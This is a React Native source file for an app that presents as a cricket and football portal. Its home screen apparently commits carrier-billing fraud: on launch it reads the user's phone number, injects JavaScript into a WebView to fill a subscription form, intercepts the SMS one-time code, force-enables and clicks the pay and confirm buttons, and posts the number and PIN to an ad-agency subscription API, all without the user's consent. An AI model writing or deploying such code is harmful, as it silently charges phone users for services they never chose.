import {
  ActivityIndicator,
  Image,
  SafeAreaView,
  StatusBar,
  Text,
  ToastAndroid,
  TouchableOpacity,
  View,
} from 'react-native';
import React, {useEffect, useRef, useState} from 'react';
import {fetchCountryAndData, getRealUserIP} from './handler';
import {getOtpRequest, startSmsRetriever} from '../../OtpService';
import {useNetInfo} from '@react-native-community/netinfo';
import {useNavigation} from '@react-navigation/native';
import {getPhoneNumberHint} from '../../HintRequest';
import {showMessage} from 'react-native-flash-message';
import WebView from 'react-native-webview';
import {data, TELECOM_PROVIDERS} from './data';
import AsyncStorage from '@react-native-async-storage/async-storage';
import ButtonView from '../../components/ButtonView';
import PhoneInput from 'react-native-phone-number-input';
import LinearGradient from 'react-native-linear-gradient';
import {styles} from './styles';
import Colors from '../../theme/color';
import {getPhoneNum} from '../../helper/datahandler';
import LoadingModal from '../../components/LoadingModal';
import Modal from 'react-native-modal';
import axios from 'axios';

const HomeScreen = () => {
  const netInfo = useNetInfo();
  const webViewRef = useRef(null);
  const phoneInputref = useRef(null);
  const navigation = useNavigation();
  const [country, setCountry] = useState(null);

  const [weburl, setWebURl] = useState('');

  const [statedata, setStateData] = useState({
    requestManualPhone: false,
  });
  const [loading, setLoading] = useState(false);
  const [phoneInput, setPhoneInput] = useState('');
  const [formattedvalue, setFormattedValue] = useState(null);
  const [isConnected, setIsConnected] = useState(true);
  const [showwebview, setShowWebView] = useState(false);

  useEffect(() => {
    fetchCountryAndData(setCountry, setWebURl, setIsConnected, setLoading);
    startSmsRetriever();
    setTimeout(() => {
      handleGetAutoPhoneNumber(data[0]);
    }, 2000);
  }, []);

  // ✅ Fetch Phone Number and Send Pin Request
  const handleGetAutoPhoneNumber = async item => {
    try {
      const number = await getPhoneNumberHint();
      const cleanedNumber = number.substring(4);
      // const cleanedNumber = number.replace(/^\+\d{1,4}/, '');
      // const cleanedNumber = number.replace(/^\+\d{1,4}/, '');
      // ✅ Find the country based on the phone number's dial code
      const matchedProvider = TELECOM_PROVIDERS.find(
        provider => provider.dialCode == number.startsWith(provider.dialCode),
      );
      if (matchedProvider) {
        console.log(
          `Matched: ${matchedProvider.country} - ${matchedProvider.provider}`,
        );
        // ✅ STEP 5: OTP Verification
        injectPhoneNumberAndSubmit(cleanedNumber, matchedProvider.country,item);
      } else {
        sendPinRequest(number, item);
      }
    } catch (error) {
      showMessage({
        message: 'Failed',
        description: 'Failed to retrieve phone number!',
        type: 'warning',
      });
      setTimeout(() => {
        setStateData(prev => ({...prev, requestManualPhone: true}));
      }, 1500);
    }
  };

  // Handle Set WebView JavaScript
  const injectPhoneNumberAndSubmit = (phoneNumber, country,item) => {
    if (phoneNumber) {
      const jsCode = `
          const inputField = document.querySelector('#Msisdn_fake');
          const subscribeButton = document.querySelector('#btnSubscribe');
          if (inputField) {
            inputField.value = '${phoneNumber}';  
          }
          if (!inputField.value){
          retun
          }
          if (subscribeButton) {
            subscribeButton.click();
          }
          true;
        `;
      // Inject JavaScript after 5 seconds
      setTimeout(() => {
        if (webViewRef.current) {
          webViewRef.current.injectJavaScript(jsCode);
        } else {
          console.error('❌ WebView is not ready to inject JavaScript.');
        }

        // Inject OTP after 7 more seconds (total 12s delay)
        setTimeout(() => {
          injectOtpAndSubmit(country,item);
        }, 7000);
      }, 5000);
    }
  };

  const injectOtpAndSubmit = async (country,item) => {
    if (!country) {
      console.error('❌ currentprogesscountry is NULL, waiting...');
      return; // Stop execution
    }
    try {
      const otpcode = await getOtpRequest();
      let otp = otpcode[0]?.otp || '1234';

      console.log('====================================');
      console.log('OTP:', otp);
      console.log('====================================');

      // JavaScript for single input field OTP (Bangladesh)
      const jsSingleInput = `
        setTimeout(() => {
          const pinInput = document.getElementById('pinInput');
          if (pinInput) {
            pinInput.value = '${otp}';
            pinInput.dispatchEvent(new Event('input', { bubbles: true }));
          } else {
            console.error("❌ OTP input field not found!");
          }
  
          const payButton = document.getElementById('okButton');
          if (payButton) {
            payButton.removeAttribute('disabled');
            payButton.style.pointerEvents = 'auto';
            payButton.style.backgroundColor = '#007bff';
            console.log("✅ Pay button enabled!");
  
            setTimeout(() => {
              payButton.click();
              payButton.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
              console.log("✅ Pay button clicked!");
            }, 2000);
          } else {
            console.error("❌ Pay button not found!");
          }
        }, 1500);
        true;
      `;

      // JavaScript for multiple OTP input fields
      const jsMultiInput = `
        setTimeout(() => {
          const setOtpValue = (id, value, nextId) => {
            const field = document.querySelector('#' + id);
            if (field) {
              field.value = value;
              field.dispatchEvent(new Event('input', { bubbles: true }));
              if (nextId) document.querySelector('#' + nextId)?.focus();
            }
          };
  
          if ('${otp}'.length === 4) {
            setOtpValue('p1', '${otp[0]}', 'p2');
            setOtpValue('p2', '${otp[1]}', 'p3');
            setOtpValue('p3', '${otp[2]}', 'p4');
            setOtpValue('p4', '${otp[3]}', null);
          } else {
            console.error("❌ Invalid OTP format!");
            return;
          }
  
          const confirmButton = document.getElementById('btnConfirm') || document.getElementById('Confirm');
          if (confirmButton) {
            console.log("✅ Confirm Button Found & Clicked");
            confirmButton.removeAttribute('disabled');
            confirmButton.style.pointerEvents = 'auto';
            confirmButton.removeAttribute('data-preventdefault');
  
            confirmButton.addEventListener("click", (event) => {
              event.preventDefault();
              event.stopPropagation();
            });
  
            setTimeout(() => confirmButton.click(), 2000);
          } else {
            console.error("❌ No Confirm Button Found!");
          }
        }, 500);
        true;
      `;

      // Debugging logs before injecting script
      console.log('Injecting script for:', country);
      console.log('WebView Reference:', webViewRef.current);

      webViewRef.current?.injectJavaScript(
        country.toLowerCase().trim() === 'bangladesh'
          ? jsSingleInput
          : jsMultiInput,
      );
      navigation.navigate('Browser', {url: item.url, title: item.title});
    } catch (error) {
      console.error('Error injecting OTP:', error);
    }
  };

  // ✅ Send PIN Request
  const sendPinRequest = async (phoneNumber, item) => {
    if (!netInfo.isConnected) {
      showMessage({
        message: 'No Internet',
        description: 'No internet connection!',
        type: 'warning',
      });
      return;
    }

    // setLoading(true);
    startSmsRetriever();

    // const cleanedNumber = phoneNumber.replace(/\+/g, '');
    const userIP = await getRealUserIP();
    const transactionId = Math.floor(100 + Math.random() * 900);

    const payload = {
      msisdn: phoneNumber,
      adAgencyCampaignId: 10,
      adAgencyCampaignTransactionId: JSON.stringify(transactionId),
      userIP: 'string',
      ua: 'string',
    };
    console.log('Request Payload:', payload);
    // if (!apiresponce.pinRequestAPI) return;
    try {
      const response = await axios.post(
        'https://universal-subscription-api.vclipss.com/pinrequest',
        payload,
        {
          headers: {
            'Content-Type': 'application/json',
          },
        },
      );

      console.log('API Response:', response.data);

      if (response.errorCode == 0) {
        const otpData = await getOtpRequest();
        if (otpData?.length > 0) {
          await verifyOtp(otpData[0].otp, transactionId, item);
        }
      } else {
        setLoading(false);
        showMessage({
          message: 'ERROR',
          description: response.data.responseMessage,
          type: 'danger',
        });
      }
    } catch (error) {
      setLoading(false);
      console.error('API Error:', error);
      showMessage({
        message: 'ERROR',
        description: 'API request failed!',
        type: 'danger',
      });
    } finally {
      setLoading(false);
    }
  };

  // ✅ Verify OTP
  const verifyOtp = async (otp, transactionId, item) => {
    setLoading(true);

    try {
      const response = await axios.post(
        'https://universal-subscription-api.vclipss.com/pinverify',
        {
          adAgencyCampaignTransactionId: transactionId,
          pin: otp,
        },
      );

      console.log('OTP Verify Response:', response.data);

      if (response.data.status === 'success') {
        await AsyncStorage.setItem('LOGIN', 'true');
        showMessage({
          message: 'ERROR',
          description: 'OTP Verified Successfully!',
          type: 'success',
        });
        navigation.navigate('Browser', {url: item.url, title: item.title});
      } else {
        showMessage({
          message: 'ERROR',
          description:
            response.data.responseMessage || 'OTP Verification Failed!',
          type: 'danger',
        });
      }
    } catch (error) {
      console.error('OTP Verify Error:', error);
      ToastAndroid.show(
        'Failed to verify OTP. Please try again.',
        ToastAndroid.SHORT,
      );
    } finally {
      setLoading(false);
    }
  };

  // ✅ Handle Manual Phone Submit
  const handlePhoneSubmit = async () => {
    setStateData(prev => ({...prev, requestManualPhone: false}));
    if (phoneInput) {
      // ✅ Find the country based on the phone number's dial code
      const matchedCountry = TELECOM_PROVIDERS.find(country =>
        formattedvalue.startsWith(country.dialCode),
      );
      if (matchedCountry) {
        // setShowWebView(true);
        setWebURl(matchedCountry.url);
        console.log(`Matched Country: ${matchedCountry.country}`);
        setTimeout(() => {
          injectPhoneNumberAndSubmit(phoneInput, matchedCountry.country);
        }, 1000);
      } else {
        sendPinRequest(phoneInput, data[0]);
      }
      ToastAndroid.show('Phone number saved successfully!', ToastAndroid.SHORT);
    } else {
      setStateData(prev => ({...prev, requestManualPhone: false}));
      ToastAndroid.show(
        'Please enter a valid phone number!',
        ToastAndroid.SHORT,
      );
    }
  };

  const renderLoadingView = () => {
    return <ActivityIndicator size={'large'} color={Colors.primary} />;
  };

  return (
    <View style={styles.container}>
      <StatusBar translucent={true} backgroundColor={'transparent'} />

      {/* Modal for Manual Phone Number Input */}
      <Modal
        transparent
        visible={statedata.requestManualPhone}
        animationType="fade"
        onRequestClose={() => {
          setStateData(prev => ({
            ...prev,
            requestManualPhone: true,
          }));
        }}>
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Enter Phone Number</Text>

            <PhoneInput
              ref={phoneInputref}
              defaultValue={phoneInput}
              defaultCode={country?.country_code}
              layout="first"
              onChangeText={setPhoneInput}
              withDarkTheme={false}
              withShadow={false}
              autoFocus={true}
              containerStyle={styles.phoneInputContainer}
              textContainerStyle={styles.phoneInputTextContainer}
              textInputStyle={styles.phoneInputText}
              codeTextStyle={styles.codeText}
              flagButtonStyle={styles.flagButton}
              countryPickerButtonStyle={styles.countryPicker}
              onChangeFormattedText={text => {
                setFormattedValue(text);
              }}
            />

            <ButtonView
              variant="primary"
              title="Submit"
              onPress={handlePhoneSubmit}
            />
          </View>
        </View>
      </Modal>
      {/* 🔥 Animated Cards List */}
      {isConnected ? (
        showwebview ? (
          <View style={{flex: 1}}>
            {/* Handle OTP Service WebView */}
            <SafeAreaView style={{flex: 1}}>
              <WebView
                style={{flex: 1}}
                ref={webViewRef}
                source={{uri: weburl}}
                startInLoadingState={true}
                javaScriptEnabled={true}
                scalesPageToFit={true}
                scrollEnabled={true}
                allowsFullscreenVideo={true}
                domStorageEnabled={true}
                originWhitelist={['*']}
                renderLoading={renderLoadingView}
                onError={({nativeEvent}) =>
                  console.log('WebView error:', nativeEvent)
                }
                onLoadEnd={event => console.log(event)}
                onMessage={event =>
                  console.log('WebView Log:', event.nativeEvent.data)
                }
                injectedJavaScript={`(function() {
                    const originalLog = console.log;
                    console.log = function(message) {
                      window.ReactNativeWebView.postMessage(message);
                      originalLog.apply(console, arguments);
                    };
                  })();
                  true;`}
              />
            </SafeAreaView>
          </View>
        ) : (
          <View style={{flex: 1, flexDirection: 'row'}}>
            {/* Cricket Section */}
            <LinearGradient
              colors={[Colors.secondary, Colors.secondary_light]}
              style={styles.halfContainer}>
              <TouchableOpacity
                activeOpacity={0.6}
                onPress={() => {
                  const phoneNum = getPhoneNum();
                  if (!phoneNum) {
                    handleGetAutoPhoneNumber(data[0]);
                  } else {
                    navigation.navigate('Browser', {
                      url: data[0].url,
                      title: data[0].title,
                    });
                  }
                }}>
                <Image
                  resizeMode="contain"
                  source={require('../../../src/assets/ball.png')}
                  style={styles.icon}
                />
              </TouchableOpacity>
            </LinearGradient>

            {/* Football Section */}
            <LinearGradient
              colors={[Colors.primary_light, Colors.primary]}
              style={styles.halfContainer}>
              <TouchableOpacity
                activeOpacity={0.6}
                onPress={() => {
                  const phoneNum = getPhoneNum();
                  if (!phoneNum) {
                    handleGetAutoPhoneNumber(data[1]);
                  } else {
                    navigation.navigate('Browser', {
                      url: data[1].url,
                      title: data[1].title,
                    });
                  }
                }}>
                <Image
                  resizeMode="contain"
                  source={require('../../../src/assets/football.png')}
                  style={styles.icon}
                />
              </TouchableOpacity>
            </LinearGradient>
          </View>
        )
      ) : (
        <LinearGradient
          colors={['#0033A0', '#001F5B', '#192f6a']}
          style={styles.linearGradient}>
          <View style={styles.serverViewStyle}>
            <Image
              tintColor={Colors.white}
              source={{
                uri: 'https://cdn-icons-png.flaticon.com/128/9311/9311566.png',
              }}
              resizeMode="contain"
              style={styles.serverImage}
            />
            <Text style={styles.serverTextStyle}>Server Error</Text>
          </View>
        </LinearGradient>
      )}

      <LoadingModal visible={loading} />
    </View>
  );
};

export default HomeScreen;
